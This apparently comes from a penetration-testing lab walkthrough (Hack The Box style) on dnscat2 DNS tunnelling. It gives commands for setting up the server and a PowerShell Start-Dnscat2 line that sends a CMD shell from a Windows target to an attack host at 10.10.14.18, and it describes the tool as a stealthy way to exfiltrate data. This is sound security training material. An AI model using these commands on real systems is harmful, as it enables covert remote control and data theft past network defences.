[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts.
 It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
 
Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

## Setting Up & Using dnscat2
---
#### Cloning dnscat2 and Setting Up the Server

	AstraX01@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git 
	
	cd dnscat2/server/ 
	sudo gem install bundler 
	sudo bundle install

#### Starting the dnscat2 server

	AstraX01@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.

#### Cloning dnscat2-powershell to the Attack Host

	AstraX01@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git

Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

#### Importing dnscat2.ps1

	PS C:\htb> Import-Module .\dnscat2.ps1

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

	PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

#### Confirming Session Establishment

	New window created: 1 
	Session 1 Security: ENCRYPTED AND VERIFIED!
	(the security depends on the strength of your pre-shared secret!) 
	
	dnscat2>

We can list the options we have with dnscat2 by entering `?` at the prompt.

#### Listing dnscat2 Options

	dnscat2> ?

